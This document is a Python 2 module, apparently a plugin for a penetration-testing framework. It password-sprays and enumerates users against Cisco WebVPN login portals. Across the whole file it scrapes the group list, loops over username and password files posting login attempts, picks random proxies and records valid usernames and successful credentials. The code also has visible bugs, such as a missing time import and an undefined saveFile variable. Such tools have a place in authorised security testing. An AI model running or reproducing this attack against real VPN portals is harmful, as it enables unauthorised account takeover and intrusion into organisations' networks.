#! /usr/bin/python
from core.webModule import webModule
from requests import session
import requests
import re
from argparse import ArgumentParser
import random

class ciscoVPN(webModule):
    def __init__(self, config, display, lock):
        super(ciscoVPN, self).__init__(config, display, lock)
        self.fingerprint="CSCOE"
        self.response=""
    def somethingCool(self, config, payload, check):
        if 'a0=24' in check:
            host = config["HOST"]
            if 'https' in host:
                host = host.strip('https://')
            else:
                host = host.strip('http://')
            if '/' in host:
                host = re.sub(r'/s\w+', '', host)
            saveFile = './tmp/validusers-ciscoVPN-' + host + '.txt'
            print("[+]  " + config["USERNAME"] + " is a valid user! Adding to valid user file (" + saveFile + ")...")
            f = open(saveFile, 'a')
            f.write(config["USERNAME"] + '\n')
            f.close()
        else:
            print("[-]  " + config["USERNAME"] + " is not a valid user account...")
    def connectTest(self, config, payload):
        with session() as c:
            proxy = random.choice(config["proxies"])
            print "Trying " + config["USERNAME"] + ":" + config["PASSWORD"] + " against the host: " + config["HOST"] + " from " + proxy
            resp1 = c.get(config["HOST"] + '/+CSCOE+/logon.html', verify=False)#, proxies=proxy)
            cookies = resp1.cookies
            cpost = c.post(config["HOST"] + '/+webvpn+/index.html', cookies=cookies, data=payload, allow_redirects=True, verify=False)#, proxies=proxy)
            check = cpost.text
            if not config["dry_run"]:
                print("[!] Time to do something cool! Checking if user is valid...")
                self.somethingCool(config, payload, check)
            m = re.search('Set-Cookie: webvpnx', str(cpost.headers))
            if m:
                print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"] + ". Adding to valid user file (" + saveFile + ")...")
                f = open(saveFile, 'a')
                f.write(config["USERNAME"] + '\n')
                f.close()
    def scraper(self, config):
        with session() as c:
            resp1 = c.get(config["HOST"] + '/+CSCOE+/logon.html', verify=False)
            selection=re.search('selected>(.*)</option', resp1.text)
            g = selection.group()
            selection = g.split('>')[1]
            selection = selection.split('<')[0]
            return selection
    def payload(self, config):
        selection = self.scraper(config)
        print selection
        if config["PASS_FILE"]:
            pass_lines = [pass_line.rstrip('\n') for pass_line in open(config["PASS_FILE"])]
            for pass_line in pass_lines:
                if config["UserFile"]:
                    lines = [line.rstrip('\n') for line in open(config["UserFile"])]
                    for line in lines:
                        config["USERNAME"] = line.strip('\n')
                        config["PASSWORD"] = pass_line.strip('\n')
                        payload = {
                            'username': config["USERNAME"],
                            'password': config["PASSWORD"],
                            'group_list': selection
                            }
                        self.connectTest(config, payload)
                        time.sleep(config["timeout"])
                else:
                    config["PASSWORD"] = pass_line.strip('\n')
                    payload = {
                        'username': config["USERNAME"],
                        'password': config["PASSWORD"],
                        'group_list': selection
                        }
                    self.connectTest(config, payload)
                    time.sleep(config["timeout"])
        elif config["UserFile"]:
            lines = [line.rstrip('\n') for line in open(config["UserFile"])]
            for line in lines:
                config["USERNAME"] = line.strip('\n')
                payload = {
                    'username': config["USERNAME"],
                    'password': config["PASSWORD"],
                    'group_list': selection
                    }
                self.connectTest(config, payload)
        else:
            payload = {
                'username': config["USERNAME"],
                'password': config["PASSWORD"],
                'group_list': selection
            }
            self.connectTest(config, payload)
